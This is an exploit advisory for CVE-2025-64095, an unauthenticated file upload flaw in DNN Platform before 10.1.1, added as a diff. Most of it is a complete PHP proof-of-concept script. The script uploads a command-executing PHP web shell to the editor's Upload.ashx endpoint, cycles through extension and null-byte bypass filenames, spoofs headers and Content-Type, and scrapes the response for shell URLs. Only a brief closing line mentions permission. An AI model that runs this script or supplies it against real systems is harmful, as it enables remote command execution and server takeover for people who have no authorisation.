@@ -1,0 +1,148 @@
+=============================================================================================================================================
+| # Title     : DNN Platform Pre‑10.1.1 Versions Unauthenticated Arbitrary File Upload                                                      |
+| # Author    : indoushka                                                                                                                   |
+| # Tested on : windows 11 Fr(Pro) / browser : Mozilla firefox 145.0.2 (64 bits)                                                            |
+| # Vendor    : https://dnncommunity.org/                                                                                                   |
+=============================================================================================================================================
+
+[+] References : https://packetstorm.news/files/id/211134/ &  	CVE-2025-64095
+
+[+] Summary : a vulnerability affecting DNN Platform (formerly DotNetNuke).Versions prior to 10.1.1 allow unauthenticated arbitrary file upload through the default HTML editor upload endpoint.
+             Missing permission checks in the file upload controller allowed attackers to upload files without authentication, and in some cases overwrite existing files.
+
+[+] An attacker could:
+
+Upload arbitrary files
+Inject malicious content
+Execute scripts depending on server configuration
+
+[+] Vulnerable Versions :
+
+All versions before 10.1.1 (e.g., 10.1.0, 10.0.x, 9.x, etc.)
+			  
+[+]  POC :   * Usage: Save this file as: exploit.php
+                                Run: php exploit.php
+								
+              <?php
+/*
+    PoC for CVE-2025-64095 - Unauthenticated File Upload
+    Author: Indoushka
+*/
+
+$target = "http://victim.com/Providers/HtmlEditorProviders/DNNConnect.CKE/Upload.ashx";
+$file_to_upload = "shell.php";
+
+// محتوى الملف الذي سيتم رفعه (شل PHP بسيط)
+$php_shell = '<?php
+if(isset($_GET["cmd"])) {
+    system($_GET["cmd"]);
+} else {
+    echo "Shell Active - " . gethostname();
+}
+?>';
+
+file_put_contents($file_to_upload, $php_shell);
+
+// محاولات لأسماء ملفات مختلفة لتجاوز الحماية
+$filenames = [
+    "shell.php",
+    "shell.php5",
+    "shell.phtml",
+    "shell.php.test",
+    "shell.php.jpg",  // قد يتم تجاهل الامتداد الثاني في بعض الأنظمة
+    "shell.php%00.jpg", // null byte injection (إذا كان النظام معرض)
+    "shell.php;.jpg",
+    "shell.php ",
+];
+
+foreach ($filenames as $filename) {
+    echo "\n[+] Trying filename: $filename\n";
+    
+    // اعداد الطلب
+    $boundary = "----Indoushka" . md5(time() . rand(1, 1000));
+    $post_data  = "--$boundary\r\n";
+    $post_data .= "Content-Disposition: form-data; name=\"upload\"; filename=\"$filename\"\r\n";
+    $post_data .= "Content-Type: text/plain\r\n\r\n"; // قد تحتاج لتغيير Content-Type
+    $post_data .= $php_shell . "\r\n";
+    $post_data .= "--$boundary--\r\n";
+
+    // ارسال الطلب
+    $ch = curl_init();
+    curl_setopt($ch, CURLOPT_URL, $target);
+    curl_setopt($ch, CURLOPT_POST, true);
+    curl_setopt($ch, CURLOPT_HTTPHEADER, array(
+        "Content-Type: multipart/form-data; boundary=$boundary",
+        "User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36",
+        "X-Forwarded-For: 127.0.0.1"
+    ));
+    curl_setopt($ch, CURLOPT_POSTFIELDS, $post_data);
+    curl_setopt($ch, CURLOPT_RETURNTRANSFER, true);
+    curl_setopt($ch, CURLOPT_FOLLOWLOCATION, true);
+    curl_setopt($ch, CURLOPT_TIMEOUT, 10);
+    
+    // إضافة بروكسي للتصحيح (اختياري)
+    // curl_setopt($ch, CURLOPT_PROXY, "127.0.0.1:8080");
+    
+    $response = curl_exec($ch);
+    $http_code = curl_getinfo($ch, CURLINFO_HTTP_CODE);
+    
+    if($response === false){
+        echo "Error: " . curl_error($ch) . "\n";
+    } else {
+        echo "[+] HTTP Code: $http_code\n";
+        echo "[+] Response (first 500 chars):\n" . substr($response, 0, 500) . "\n";
+        
+        // التحقق من وجود مؤشرات على نجاح الرفع
+        if (strpos($response, 'success') !== false || 
+            strpos($response, 'url') !== false ||
+            strpos($response, '.php') !== false) {
+            echo "[!] Possible successful upload detected!\n";
+            
+            // محاولة استخراج رابط الملف المرفوع
+            preg_match_all('/"(http[^"]+\.php[^"]*)"/i', $response, $matches);
+            if (!empty($matches[1])) {
+                echo "[+] Found potential shell URLs:\n";
+                foreach ($matches[1] as $url) {
+                    echo "    - $url\n";
+                }
+            }
+        }
+    }
+    
+    curl_close($ch);
+    sleep(1); // تجنب rate limiting
+}
+
+// محاولة برفع مع Content-Type مختلف
+echo "\n[+] Trying with different Content-Type...\n";
+$boundary = "----Indoushka" . md5(time());
+$post_data  = "--$boundary\r\n";
+$post_data .= "Content-Disposition: form-data; name=\"upload\"; filename=\"shell.php\"\r\n";
+$post_data .= "Content-Type: image/jpeg\r\n\r\n"; // Content-Type مضلل
+$post_data .= $php_shell . "\r\n";
+$post_data .= "--$boundary--\r\n";
+
+$ch = curl_init();
+curl_setopt($ch, CURLOPT_URL, $target);
+curl_setopt($ch, CURLOPT_POST, true);
+curl_setopt($ch, CURLOPT_HTTPHEADER, array(
+    "Content-Type: multipart/form-data; boundary=$boundary"
+));
+curl_setopt($ch, CURLOPT_POSTFIELDS, $post_data);
+curl_setopt($ch, CURLOPT_RETURNTRANSFER, true);
+
+$response = curl_exec($ch);
+echo "[+] Response with fake Content-Type: " . substr($response, 0, 300) . "\n";
+curl_close($ch);
+
+// تنظيف الملف المحلي
+if (file_exists($file_to_upload)) {
+    unlink($file_to_upload);
+}
+
+echo "\n[!] Remember: Use only on systems you own or have permission to test!\n";
+?>
+
+Greetings to :=====================================================================================
+jericho * Larry W. Cashdollar * LiquidWorm * Hussin-X * D4NB4R * Malvuln (John Page aka hyp3rlinx)|
+===================================================================================================
